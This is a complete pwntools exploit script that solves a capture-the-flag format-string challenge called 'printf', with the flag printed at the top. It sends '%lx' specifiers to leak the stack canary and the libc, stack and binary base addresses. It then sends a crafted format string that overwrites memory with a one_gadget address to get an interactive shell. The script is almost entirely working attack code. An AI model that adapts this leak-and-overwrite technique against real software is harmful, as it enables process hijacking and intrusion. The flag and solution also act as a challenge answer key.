#FLAG TWCTF{Pudding_Pudding_Pudding_purintoehu}
#!/usr/bin/python
from pwn import *
from time import sleep
context.binary = "/home/a/Desktop/tokyo/printf"
context.arch = "amd64"
context.os = "linux"
context.terminal = ['tmux','splitw','-h']
def r(p):
    s = p.recv()
    print(s)
    return s
p = remote('printf.chal.ctf.westerns.tokyo', 10001)
#p = gdb.debug(['/home/a/Desktop/tokyo/printf'], gdbscript='')#b *(0x555555554000+0x2940)\n') #b *(0x14F5+0x555555554000)') #b *(0x000000000001Ce6+ 0x555555554000)\n r\n')
#p = process("/home/a/Desktop/tokyo/printf")
token = "%lx "
#p.sendline("%118446744073709551615%x%x%s")

r(p)
#p.interactive()
p.sendline(token*((0x100-4)/4))
sleep(2)
s = r(p)
s = s.split()
s = s[1:-5]
print(s)

leaked_data = []
l = 0
for i in range(len(s)):
    leaked_data.append(int(s[i], 16))
    print("--------------")
    print(l)
    print(hex(leaked_data[-1]))
    l += 1
canary = leaked_data[40]
libc = leaked_data[1] -(0x7ffff7fc8580-0x7ffff7de1000)
stack = leaked_data[39]
binary_base = leaked_data[41] - (0x555555556a40- 0x555555554000)



print("-----------------------------------------")
print("Canary: {}".format(hex(canary)))
print("-----------------------------------------")
print("Libc base: {}".format(hex(libc)))
print("-----------------------------------------")
print("Stack: {}".format(hex(stack)))
print("-----------------------------------------")
print("Binary Base: {}".format(hex(binary_base)))
print("-----------------------------------------")
libc_minus_stack = stack - libc
where_to_write = libc_minus_stack-1979288-4104-0x1000 - 5820+8-8+8
one_gadget = p64(libc+0xe2383)
mystr = "%{}xAAAAAAAABBBBBBBBCCCCCCCC{}CCCCCCCC{}XXXXXXXX".format(where_to_write, one_gadget, "A")
print(hex(len(mystr)))
p.sendline(mystr) 
sleep(2)
p.interactive()
